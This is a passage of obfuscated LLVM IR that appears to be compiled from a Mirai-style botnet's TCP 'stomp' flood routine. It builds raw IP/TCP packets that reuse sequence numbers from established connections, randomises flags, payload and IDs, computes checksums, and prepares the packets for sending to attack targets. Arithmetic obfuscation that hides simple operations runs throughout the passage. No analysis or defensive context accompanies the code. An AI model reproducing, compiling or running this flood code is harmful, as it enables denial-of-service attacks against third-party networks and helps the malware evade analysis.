; <label>:278:                                    ; preds = %263
  %279 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %280 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 4
  %282 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %283 = load i32, i32* %9, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %282, i64 %284
  %286 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %285, i32 0, i32 0
  store i32 %281, i32* %286, align 4
  %287 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %288 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %287, i32 0, i32 2
  %289 = load i32, i32* %288, align 4
  %290 = call i32 @ntohl(i32 %289) #7
  %291 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %292 = load i32, i32* %9, align 4
  %293 = sext i32 %292 to i64
  %294 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %291, i64 %293
  %295 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %294, i32 0, i32 1
  store i32 %290, i32* %295, align 4
  %296 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %297 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %296, i32 0, i32 3
  %298 = load i32, i32* %297, align 4
  %299 = call i32 @ntohl(i32 %298) #7
  %300 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %301 = load i32, i32* %9, align 4
  %302 = sext i32 %301 to i64
  %303 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %300, i64 %302
  %304 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %303, i32 0, i32 2
  store i32 %299, i32* %304, align 4
  %305 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %306 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %305, i32 0, i32 1
  %307 = load i16, i16* %306, align 2
  %308 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %309 = load i32, i32* %9, align 4
  %310 = sext i32 %309 to i64
  %311 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %308, i64 %310
  %312 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %311, i32 0, i32 3
  store i16 %307, i16* %312, align 4
  %313 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %314 = load i16, i16* %313, align 2
  %315 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %316 = load i32, i32* %9, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %315, i64 %317
  %319 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %318, i32 0, i32 4
  store i16 %314, i16* %319, align 2
  %320 = load i32, i32* %24, align 4
  %321 = sext i32 %320 to i64
  %322 = sub i64 0, 40
  %323 = sub i64 0, %321
  %324 = add i64 %322, %323
  %325 = sub i64 0, %324
  %326 = add i64 40, %321
  %327 = call noalias i8* @malloc(i64 %325) #6
  %328 = load i8**, i8*** %12, align 8
  %329 = load i32, i32* %9, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds i8*, i8** %328, i64 %330
  store i8* %327, i8** %331, align 8
  %332 = load i8**, i8*** %12, align 8
  %333 = load i32, i32* %9, align 4
  %334 = sext i32 %333 to i64
  %335 = getelementptr inbounds i8*, i8** %332, i64 %334
  %336 = load i8*, i8** %335, align 8
  %337 = bitcast i8* %336 to %struct.iphdr*
  store %struct.iphdr* %337, %struct.iphdr** %36, align 8
  %338 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %339 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %338, i64 1
  %340 = bitcast %struct.iphdr* %339 to %struct.tcphdr*
  store %struct.tcphdr* %340, %struct.tcphdr** %37, align 8
  %341 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %342 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %341, i64 1
  %343 = bitcast %struct.tcphdr* %342 to i8*
  store i8* %343, i8** %38, align 8
  %344 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %345 = bitcast %struct.iphdr* %344 to i8*
  %346 = load i8, i8* %345, align 4
  %347 = xor i8 %346, -1
  %348 = xor i8 15, -1
  %349 = xor i8 71, -1
  %350 = or i8 %347, %348
  %351 = or i8 71, %349
  %352 = xor i8 %350, -1
  %353 = and i8 %352, %351
  %354 = and i8 %346, 15
  %355 = xor i8 %353, -1
  %356 = xor i8 64, -1
  %357 = xor i8 98, -1
  %358 = and i8 %355, 98
  %359 = and i8 %353, %357
  %360 = and i8 %356, 98
  %361 = and i8 64, %357
  %362 = or i8 %358, %359
  %363 = or i8 %360, %361
  %364 = xor i8 %362, %363
  %365 = or i8 %355, %356
  %366 = xor i8 %365, -1
  %367 = or i8 98, %357
  %368 = and i8 %366, %367
  %369 = or i8 %364, %368
  %370 = or i8 %353, 64
  store i8 %369, i8* %345, align 4
  %371 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %372 = bitcast %struct.iphdr* %371 to i8*
  %373 = load i8, i8* %372, align 4
  %374 = xor i8 -16, -1
  %375 = xor i8 %373, %374
  %376 = and i8 %375, %373
  %377 = and i8 %373, -16
  %378 = xor i8 %376, -1
  %379 = xor i8 5, -1
  %380 = xor i8 69, -1
  %381 = and i8 %378, 69
  %382 = and i8 %376, %380
  %383 = and i8 %379, 69
  %384 = and i8 5, %380
  %385 = or i8 %381, %382
  %386 = or i8 %383, %384
  %387 = xor i8 %385, %386
  %388 = or i8 %378, %379
  %389 = xor i8 %388, -1
  %390 = or i8 69, %380
  %391 = and i8 %389, %390
  %392 = or i8 %387, %391
  %393 = or i8 %376, 5
  store i8 %392, i8* %372, align 4
  %394 = load i8, i8* %13, align 1
  %395 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %396 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %395, i32 0, i32 1
  store i8 %394, i8* %396, align 1
  %397 = load i32, i32* %24, align 4
  %398 = sext i32 %397 to i64
  %399 = sub i64 0, %398
  %400 = sub i64 40, %399
  %401 = add i64 40, %398
  %402 = trunc i64 %400 to i16
  %403 = call zeroext i16 @htons(i16 zeroext %402) #7
  %404 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %405 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %404, i32 0, i32 2
  store i16 %403, i16* %405, align 2
  %406 = load i16, i16* %14, align 2
  %407 = call zeroext i16 @htons(i16 zeroext %406) #7
  %408 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 3
  store i16 %407, i16* %409, align 4
  %410 = load i8, i8* %15, align 1
  %411 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i32 0, i32 5
  store i8 %410, i8* %412, align 4
  %413 = load i8, i8* %16, align 1
  %414 = icmp ne i8 %413, 0
  br i1 %414, label %415, label %419

; <label>:415:                                    ; preds = %278
  %416 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %417 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %418 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %417, i32 0, i32 4
  store i16 %416, i16* %418, align 2
  br label %419

; <label>:419:                                    ; preds = %415, %278
  %420 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %421 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %420, i32 0, i32 6
  store i8 6, i8* %421, align 1
  %422 = load i32, i32* @LOCAL_ADDR, align 4
  %423 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 8
  store i32 %422, i32* %424, align 4
  %425 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %426 = load i32, i32* %9, align 4
  %427 = sext i32 %426 to i64
  %428 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %425, i64 %427
  %429 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %428, i32 0, i32 0
  %430 = load i32, i32* %429, align 4
  %431 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %432 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %431, i32 0, i32 9
  store i32 %430, i32* %432, align 4
  %433 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %434 = load i32, i32* %9, align 4
  %435 = sext i32 %434 to i64
  %436 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %433, i64 %435
  %437 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %436, i32 0, i32 3
  %438 = load i16, i16* %437, align 4
  %439 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %440 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %439, i32 0, i32 0
  store i16 %438, i16* %440, align 4
  %441 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %442 = load i32, i32* %9, align 4
  %443 = sext i32 %442 to i64
  %444 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %441, i64 %443
  %445 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %444, i32 0, i32 4
  %446 = load i16, i16* %445, align 2
  %447 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %448 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %447, i32 0, i32 1
  store i16 %446, i16* %448, align 2
  %449 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %450 = load i32, i32* %9, align 4
  %451 = sext i32 %450 to i64
  %452 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %449, i64 %451
  %453 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %452, i32 0, i32 2
  %454 = load i32, i32* %453, align 4
  %455 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %456 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %455, i32 0, i32 2
  store i32 %454, i32* %456, align 4
  %457 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %458 = load i32, i32* %9, align 4
  %459 = sext i32 %458 to i64
  %460 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %457, i64 %459
  %461 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %460, i32 0, i32 1
  %462 = load i32, i32* %461, align 4
  %463 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %464 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %463, i32 0, i32 3
  store i32 %462, i32* %464, align 4
  %465 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %466 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %465, i32 0, i32 4
  %467 = load i16, i16* %466, align 4
  %468 = xor i16 %467, -1
  %469 = xor i16 -241, -1
  %470 = xor i16 16771, -1
  %471 = or i16 %468, %469
  %472 = or i16 16771, %470
  %473 = xor i16 %471, -1
  %474 = and i16 %473, %472
  %475 = and i16 %467, -241
  %476 = xor i16 %474, -1
  %477 = xor i16 128, -1
  %478 = xor i16 27601, -1
  %479 = and i16 %476, 27601
  %480 = and i16 %474, %478
  %481 = and i16 %477, 27601
  %482 = and i16 128, %478
  %483 = or i16 %479, %480
  %484 = or i16 %481, %482
  %485 = xor i16 %483, %484
  %486 = or i16 %476, %477
  %487 = xor i16 %486, -1
  %488 = or i16 27601, %478
  %489 = and i16 %487, %488
  %490 = or i16 %485, %489
  %491 = or i16 %474, 128
  store i16 %490, i16* %466, align 4
  %492 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %493 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %492, i32 0, i32 4
  %494 = load i16, i16* %493, align 4
  %495 = xor i16 %494, -1
  %496 = xor i16 -257, -1
  %497 = xor i16 2789, -1
  %498 = or i16 %495, %496
  %499 = or i16 2789, %497
  %500 = xor i16 %498, -1
  %501 = and i16 %500, %499
  %502 = and i16 %494, -257
  %503 = and i16 %501, 256
  %504 = xor i16 %501, 256
  %505 = or i16 %503, %504
  %506 = or i16 %501, 256
  store i16 %505, i16* %493, align 4
  %507 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %508 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %507, i32 0, i32 4
  %509 = load i16, i16* %508, align 4
  %510 = xor i16 -4097, -1
  %511 = xor i16 %509, %510
  %512 = and i16 %511, %509
  %513 = and i16 %509, -4097
  %514 = xor i16 %512, -1
  %515 = xor i16 4096, -1
  %516 = xor i16 4449, -1
  %517 = and i16 %514, 4449
  %518 = and i16 %512, %516
  %519 = and i16 %515, 4449
  %520 = and i16 4096, %516
  %521 = or i16 %517, %518
  %522 = or i16 %519, %520
  %523 = xor i16 %521, %522
  %524 = or i16 %514, %515
  %525 = xor i16 %524, -1
  %526 = or i16 4449, %516
  %527 = and i16 %525, %526
  %528 = or i16 %523, %527
  %529 = or i16 %512, 4096
  store i16 %528, i16* %508, align 4
  %530 = call i32 @rand_next()
  %531 = xor i32 %530, -1
  %532 = xor i32 65535, -1
  %533 = xor i32 1954131363, -1
  %534 = or i32 %531, %532
  %535 = or i32 1954131363, %533
  %536 = xor i32 %534, -1
  %537 = and i32 %536, %535
  %538 = and i32 %530, 65535
  %539 = trunc i32 %537 to i16
  %540 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %541 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %540, i32 0, i32 5
  store i16 %539, i16* %541, align 2
  %542 = load i8, i8* %18, align 1
  %543 = sext i8 %542 to i16
  %544 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 4
  %546 = load i16, i16* %545, align 4
  %547 = xor i16 %543, -1
  %548 = xor i16 1, -1
  %549 = xor i16 -9364, -1
  %550 = or i16 %547, %548
  %551 = or i16 -9364, %549
  %552 = xor i16 %550, -1
  %553 = and i16 %552, %551
  %554 = and i16 %543, 1
  %555 = shl i16 %553, 13
  %556 = xor i16 %546, -1
  %557 = xor i16 -8193, -1
  %558 = xor i16 -23865, -1
  %559 = or i16 %556, %557
  %560 = or i16 -23865, %558
  %561 = xor i16 %559, -1
  %562 = and i16 %561, %560
  %563 = and i16 %546, -8193
  %564 = xor i16 %562, -1
  %565 = xor i16 %555, -1
  %566 = xor i16 -29085, -1
  %567 = and i16 %564, -29085
  %568 = and i16 %562, %566
  %569 = and i16 %565, -29085
  %570 = and i16 %555, %566
  %571 = or i16 %567, %568
  %572 = or i16 %569, %570
  %573 = xor i16 %571, %572
  %574 = or i16 %564, %565
  %575 = xor i16 %574, -1
  %576 = or i16 -29085, %566
  %577 = and i16 %575, %576
  %578 = or i16 %573, %577
  %579 = or i16 %562, %555
  store i16 %578, i16* %545, align 4
  %580 = load i8, i8* %19, align 1
  %581 = sext i8 %580 to i16
  %582 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %583 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %582, i32 0, i32 4
  %584 = load i16, i16* %583, align 4
  %585 = xor i16 1, -1
  %586 = xor i16 %581, %585
  %587 = and i16 %586, %581
  %588 = and i16 %581, 1
  %589 = shl i16 %587, 12
  %590 = xor i16 -4097, -1
  %591 = xor i16 %584, %590
  %592 = and i16 %591, %584
  %593 = and i16 %584, -4097
  %594 = xor i16 %592, -1
  %595 = xor i16 %589, -1
  %596 = xor i16 21974, -1
  %597 = and i16 %594, 21974
  %598 = and i16 %592, %596
  %599 = and i16 %595, 21974
  %600 = and i16 %589, %596
  %601 = or i16 %597, %598
  %602 = or i16 %599, %600
  %603 = xor i16 %601, %602
  %604 = or i16 %594, %595
  %605 = xor i16 %604, -1
  %606 = or i16 21974, %596
  %607 = and i16 %605, %606
  %608 = or i16 %603, %607
  %609 = or i16 %592, %589
  store i16 %608, i16* %583, align 4
  %610 = load i8, i8* %20, align 1
  %611 = sext i8 %610 to i16
  %612 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %613 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %612, i32 0, i32 4
  %614 = load i16, i16* %613, align 4
  %615 = xor i16 1, -1
  %616 = xor i16 %611, %615
  %617 = and i16 %616, %611
  %618 = and i16 %611, 1
  %619 = shl i16 %617, 11
  %620 = xor i16 %614, -1
  %621 = xor i16 -2049, -1
  %622 = xor i16 -30390, -1
  %623 = or i16 %620, %621
  %624 = or i16 -30390, %622
  %625 = xor i16 %623, -1
  %626 = and i16 %625, %624
  %627 = and i16 %614, -2049
  %628 = and i16 %626, %619
  %629 = xor i16 %626, %619
  %630 = or i16 %628, %629
  %631 = or i16 %626, %619
  store i16 %630, i16* %613, align 4
  %632 = load i8, i8* %21, align 1
  %633 = sext i8 %632 to i16
  %634 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %635 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %634, i32 0, i32 4
  %636 = load i16, i16* %635, align 4
  %637 = xor i16 1, -1
  %638 = xor i16 %633, %637
  %639 = and i16 %638, %633
  %640 = and i16 %633, 1
  %641 = shl i16 %639, 10
  %642 = xor i16 %636, -1
  %643 = xor i16 -1025, -1
  %644 = xor i16 -6723, -1
  %645 = or i16 %642, %643
  %646 = or i16 -6723, %644
  %647 = xor i16 %645, -1
  %648 = and i16 %647, %646
  %649 = and i16 %636, -1025
  %650 = xor i16 %648, -1
  %651 = xor i16 %641, -1
  %652 = xor i16 -3652, -1
  %653 = and i16 %650, -3652
  %654 = and i16 %648, %652
  %655 = and i16 %651, -3652
  %656 = and i16 %641, %652
  %657 = or i16 %653, %654
  %658 = or i16 %655, %656
  %659 = xor i16 %657, %658
  %660 = or i16 %650, %651
  %661 = xor i16 %660, -1
  %662 = or i16 -3652, %652
  %663 = and i16 %661, %662
  %664 = or i16 %659, %663
  %665 = or i16 %648, %641
  store i16 %664, i16* %635, align 4
  %666 = load i8, i8* %22, align 1
  %667 = sext i8 %666 to i16
  %668 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %669 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %668, i32 0, i32 4
  %670 = load i16, i16* %669, align 4
  %671 = xor i16 %667, -1
  %672 = xor i16 1, -1
  %673 = xor i16 -16160, -1
  %674 = or i16 %671, %672
  %675 = or i16 -16160, %673
  %676 = xor i16 %674, -1
  %677 = and i16 %676, %675
  %678 = and i16 %667, 1
  %679 = shl i16 %677, 9
  %680 = xor i16 -513, -1
  %681 = xor i16 %670, %680
  %682 = and i16 %681, %670
  %683 = and i16 %670, -513
  %684 = xor i16 %682, -1
  %685 = xor i16 %679, -1
  %686 = xor i16 -24808, -1
  %687 = and i16 %684, -24808
  %688 = and i16 %682, %686
  %689 = and i16 %685, -24808
  %690 = and i16 %679, %686
  %691 = or i16 %687, %688
  %692 = or i16 %689, %690
  %693 = xor i16 %691, %692
  %694 = or i16 %684, %685
  %695 = xor i16 %694, -1
  %696 = or i16 -24808, %686
  %697 = and i16 %695, %696
  %698 = or i16 %693, %697
  %699 = or i16 %682, %679
  store i16 %698, i16* %669, align 4
  %700 = load i8, i8* %23, align 1
  %701 = sext i8 %700 to i16
  %702 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %703 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %702, i32 0, i32 4
  %704 = load i16, i16* %703, align 4
  %705 = xor i16 1, -1
  %706 = xor i16 %701, %705
  %707 = and i16 %706, %701
  %708 = and i16 %701, 1
  %709 = shl i16 %707, 8
  %710 = xor i16 -257, -1
  %711 = xor i16 %704, %710
  %712 = and i16 %711, %704
  %713 = and i16 %704, -257
  %714 = and i16 %712, %709
  %715 = xor i16 %712, %709
  %716 = or i16 %714, %715
  %717 = or i16 %712, %709
  store i16 %716, i16* %703, align 4
  %718 = load i8*, i8** %38, align 8
  %719 = load i32, i32* %24, align 4
  call void @rand_str(i8* %718, i32 %719)
  br label %764

; <label>:720:                                    ; preds = %263, %252
  %721 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %722 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %721, i32 0, i32 4
  %723 = load i16, i16* %722, align 4
  %724 = lshr i16 %723, 8
  %725 = xor i16 %724, -1
  %726 = xor i16 1, -1
  %727 = xor i16 9585, -1
  %728 = or i16 %725, %726
  %729 = or i16 9585, %727
  %730 = xor i16 %728, -1
  %731 = and i16 %730, %729
  %732 = and i16 %724, 1
  %733 = zext i16 %731 to i32
  %734 = icmp ne i32 %733, 0
  br i1 %734, label %746, label %735

; <label>:735:                                    ; preds = %720
  %736 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %737 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %736, i32 0, i32 4
  %738 = load i16, i16* %737, align 4
  %739 = lshr i16 %738, 10
  %740 = xor i16 1, -1
  %741 = xor i16 %739, %740
  %742 = and i16 %741, %739
  %743 = and i16 %739, 1
  %744 = zext i16 %742 to i32
  %745 = icmp ne i32 %744, 0
  br i1 %745, label %746, label %749

; <label>:746:                                    ; preds = %735, %720
  %747 = load i32, i32* %26, align 4
  %748 = call i32 @close(i32 %747)
  br label %121

; <label>:749:                                    ; preds = %735
  br label %750

; <label>:750:                                    ; preds = %749
  br label %751

; <label>:751:                                    ; preds = %750, %240
  br label %752

; <label>:752:                                    ; preds = %751, %236, %228
  %753 = call i64 @time(i64* null) #6
  %754 = load i64, i64* %31, align 8
  %755 = add i64 %753, 4413681621180099608
  %756 = sub i64 %755, %754
  %757 = sub i64 %756, 4413681621180099608
  %758 = sub nsw i64 %753, %754
  %759 = icmp sgt i64 %757, 10
  br i1 %759, label %760, label %763

; <label>:760:                                    ; preds = %752
  %761 = load i32, i32* %26, align 4
  %762 = call i32 @close(i32 %761)
  br label %121

; <label>:763:                                    ; preds = %752
  br label %216

; <label>:764:                                    ; preds = %419
  br label %765

; <label>:765:                                    ; preds = %764, %124
  %766 = load i32, i32* %9, align 4
  %767 = sub i32 %766, -291455835
  %768 = add i32 %767, 1
  %769 = add i32 %768, -291455835
  %770 = add nsw i32 %766, 1
  store i32 %769, i32* %9, align 4
  br label %115

; <label>:771:                                    ; preds = %115
  br label %772

; <label>:772:                                    ; preds = %901, %771
  store i32 0, i32* %9, align 4
  br label %773

; <label>:773:                                    ; preds = %895, %772
  %774 = load i32, i32* %9, align 4
  %775 = load i8, i8* %5, align 1
  %776 = zext i8 %775 to i32
  %777 = icmp slt i32 %774, %776
  br i1 %777, label %778, label %901

; <label>:778:                                    ; preds = %773
  %779 = load i8**, i8*** %12, align 8
  %780 = load i32, i32* %9, align 4
  %781 = sext i32 %780 to i64
  %782 = getelementptr inbounds i8*, i8** %779, i64 %781
  %783 = load i8*, i8** %782, align 8
  store i8* %783, i8** %39, align 8
  %784 = load i8*, i8** %39, align 8
  %785 = bitcast i8* %784 to %struct.iphdr*
  store %struct.iphdr* %785, %struct.iphdr** %40, align 8
  %786 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %787 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %786, i64 1
  %788 = bitcast %struct.iphdr* %787 to %struct.tcphdr*
  store %struct.tcphdr* %788, %struct.tcphdr** %41, align 8
  %789 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %790 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %789, i64 1
  %791 = bitcast %struct.tcphdr* %790 to i8*
  store i8* %791, i8** %42, align 8
  %792 = load i16, i16* %14, align 2
  %793 = zext i16 %792 to i32
  %794 = icmp eq i32 %793, 65535
  br i1 %794, label %795, label %804

; <label>:795:                                    ; preds = %778
  %796 = call i32 @rand_next()
  %797 = xor i32 65535, -1
  %798 = xor i32 %796, %797
  %799 = and i32 %798, %796
  %800 = and i32 %796, 65535
  %801 = trunc i32 %799 to i16
  %802 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %803 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %802, i32 0, i32 3
  store i16 %801, i16* %803, align 4
  br label %804

; <label>:804:                                    ; preds = %795, %778
  %805 = load i8, i8* %25, align 1
  %806 = icmp ne i8 %805, 0
  br i1 %806, label %807, label %810

; <label>:807:                                    ; preds = %804
  %808 = load i8*, i8** %42, align 8
  %809 = load i32, i32* %24, align 4
  call void @rand_str(i8* %808, i32 %809)
  br label %810

; <label>:810:                                    ; preds = %807, %804
  %811 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %812 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %811, i32 0, i32 7
  store i16 0, i16* %812, align 2
  %813 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %814 = bitcast %struct.iphdr* %813 to i16*
  %815 = call zeroext i16 @checksum_generic(i16* %814, i32 20)
  %816 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %817 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %816, i32 0, i32 7
  store i16 %815, i16* %817, align 2
  %818 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %819 = load i32, i32* %9, align 4
  %820 = sext i32 %819 to i64
  %821 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %818, i64 %820
  %822 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %821, i32 0, i32 1
  %823 = load i32, i32* %822, align 4
  %824 = add i32 %823, -1685928117
  %825 = add i32 %824, 1
  %826 = sub i32 %825, -1685928117
  %827 = add i32 %823, 1
  store i32 %826, i32* %822, align 4
  %828 = trunc i32 %823 to i16
  %829 = call zeroext i16 @htons(i16 zeroext %828) #7
  %830 = zext i16 %829 to i32
  %831 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %832 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %831, i32 0, i32 2
  store i32 %830, i32* %832, align 4
  %833 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %834 = load i32, i32* %9, align 4
  %835 = sext i32 %834 to i64
  %836 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %833, i64 %835
  %837 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %836, i32 0, i32 2
  %838 = load i32, i32* %837, align 4
  %839 = trunc i32 %838 to i16
  %840 = call zeroext i16 @htons(i16 zeroext %839) #7
  %841 = zext i16 %840 to i32
  %842 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %843 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %842, i32 0, i32 3
  store i32 %841, i32* %843, align 4
  %844 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %845 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %844, i32 0, i32 6
  store i16 0, i16* %845, align 4
  %846 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %847 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %848 = bitcast %struct.tcphdr* %847 to i8*
  %849 = load i32, i32* %24, align 4
  %850 = sext i32 %849 to i64
  %851 = sub i64 0, 20
  %852 = sub i64 0, %850
  %853 = add i64 %851, %852
  %854 = sub i64 0, %853
  %855 = add i64 20, %850
  %856 = trunc i64 %854 to i16
  %857 = call zeroext i16 @htons(i16 zeroext %856) #7
  %858 = load i32, i32* %24, align 4
  %859 = sext i32 %858 to i64
  %860 = add i64 20, 4468735502761039829
  %861 = add i64 %860, %859
  %862 = sub i64 %861, 4468735502761039829
  %863 = add i64 20, %859
  %864 = trunc i64 %862 to i32
  %865 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %846, i8* %848, i16 zeroext %857, i32 %864)
  %866 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %867 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %866, i32 0, i32 6
  store i16 %865, i16* %867, align 4
  %868 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %869 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %868, i32 0, i32 1
  %870 = load i16, i16* %869, align 2
  %871 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %872 = load i32, i32* %9, align 4
  %873 = sext i32 %872 to i64
  %874 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %871, i64 %873
  %875 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %874, i32 0, i32 0
  %876 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %875, i32 0, i32 1
  store i16 %870, i16* %876, align 2
  %877 = load i32, i32* %10, align 4
  %878 = load i8*, i8** %39, align 8
  %879 = load i32, i32* %24, align 4
  %880 = sext i32 %879 to i64
  %881 = sub i64 40, -7563158430376801961
  %882 = add i64 %881, %880
  %883 = add i64 %882, -7563158430376801961
  %884 = add i64 40, %880
  %885 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %886 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %887 = load i32, i32* %9, align 4
  %888 = sext i32 %887 to i64
  %889 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %886, i64 %888
  %890 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %889, i32 0, i32 0
  %891 = bitcast %struct.sockaddr_in* %890 to %struct.sockaddr*
